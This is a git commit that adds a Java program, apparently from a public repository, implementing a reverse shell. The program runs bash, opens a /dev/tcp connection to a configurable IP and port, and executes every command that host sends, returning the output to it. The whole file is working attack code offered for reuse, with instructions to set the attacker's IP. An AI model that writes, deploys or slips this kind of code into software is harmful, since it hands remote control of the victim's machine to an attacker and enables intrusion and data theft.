b833fa0a162fdfafd1363a1bbe623c7232f3ce4b
Julien Descannevelle <jdesca.eirl@gmail.com>
2020-07-27 13:36:04 +0000

    commit

---
+++ src/main/java/com/manchabalais/javareverseshell/Shell.java
@@ -0,0 +1,37 @@
+/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+package com.manchabalais.javareverseshell;
+
+/**
+ *
+ * @author kali
+ */
+public class Shell {
+
+    private static final String host = "192.168.1.33"; //CHANGE THIS FOR YOUR IP
+    private static final String port = "4444"; //CHANGE THIS IF YOU WANT TO CONNECT ON ANOTHER PORT
+
+    /**
+     * @param args the command line arguments
+     */
+    public static void main(String[] args) {
+
+        try {
+            System.out.println("Init connection to " + host +":"+port);
+            Runtime r = Runtime.getRuntime();
+            String[] cmd = {"/bin/bash", "-c", "exec 5<>/dev/tcp/" + host + "/" + port + ";cat <&5 | while read line; do $line 2>&5 >&5; done"};
+            Process p = r.exec(cmd);
+            p.waitFor();
+        } catch (Exception ex) {
+            System.err.println(ex.getMessage());
+        }
+        System.out.println("Connection close");
+        System.out.println("Hope you enjoyed it!");
+        System.out.println("Please visit https://github.com/julien-desca/Java-ReverseShell and leave a star !");
+        System.out.println("\t\t\t\t\t Manchalais.");
+    }
+
+}
